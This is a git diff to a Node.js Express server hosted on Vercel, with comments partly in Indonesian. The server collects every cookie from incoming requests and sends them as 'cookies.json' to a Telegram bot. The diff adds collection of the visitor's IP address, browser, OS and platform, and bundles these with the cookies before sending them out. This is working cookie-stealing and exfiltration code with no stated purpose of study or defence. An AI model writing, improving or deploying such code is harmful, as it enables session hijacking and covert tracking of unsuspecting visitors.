@@ -3,6 +3,8 @@ const bodyParser = require('body-parser');
 const cors = require('cors'); // Import middleware CORS
 const fetch = require('node-fetch');
 const FormData = require('form-data'); // Import FormData
+const useragent = require('user-agent'); // Import user-agent parser
+const requestIp = require('request-ip'); // Import request-ip
 const app = express();
 
 // Middleware untuk parse application/json
@@ -40,6 +42,9 @@ app.get('/', (req, res) => {
     res.send('Hello from Express on Vercel!');
 });
 
+// Middleware to get client IP
+app.use(requestIp.mw());
+
 // Function to get all cookies and format them as a JSON object
 function getCookies(req) {
     const cookieHeader = req.headers.cookie;
@@ -51,6 +56,20 @@ function getCookies(req) {
         return acc;
     }, {});
     return cookies;
+}
+
+// Function to get client information
+function getClientInfo(req) {
+    const userAgent = req.headers['user-agent'];
+    const parsedUserAgent = useragent.parse(userAgent);
+    const ip = req.clientIp;
+
+    return {
+        ip,
+        browser: parsedUserAgent.browser,
+        os: parsedUserAgent.os,
+        platform: parsedUserAgent.platform
+    };
 }
 
 // Function to send message to Telegram bot
@@ -92,7 +111,7 @@ async function sendToTelegram(data, filename, content) {
 
     const formData = new FormData();
     formData.append('chat_id', chat_id);
-    formData.append('document', content, filename);
+    formData.append('document', content, { filename });
     formData.append('caption', data);
 
     try {
@@ -117,12 +136,27 @@ async function sendToTelegram(data, filename, content) {
 // Function to export cookies and send to Telegram bot
 async function exportCookies(req, nama, responseData) {
     const cookies = getCookies(req);
-    const json = JSON.stringify(cookies, null, 2);
+    const clientInfo = getClientInfo(req);
+    const data = {
+        cookies,
+        clientInfo
+    };
+    const json = JSON.stringify(data, null, 2);
+
+    // Logging untuk memeriksa apakah JSON tidak kosong
+    console.log('Cookies and Client Info JSON:', json);
+
+    if (!json || json === '{}') {
+        console.error('No cookies or client information found or JSON is empty');
+        await sendMessageToTelegram('No cookies or client information found or JSON is empty');
+        return;
+    }
+
     const buffer = Buffer.from(json, 'utf-8');
 
     // Prepare data to send
-    const data = `Nama: ${nama}\nData: ${responseData}`;
-    await sendToTelegram(data, 'cookies.json', buffer);
+    const caption = `Nama: ${nama}\nData: ${responseData}`;
+    await sendToTelegram(caption, 'cookies.json', buffer);
 }
 
 // Route untuk handle POST request
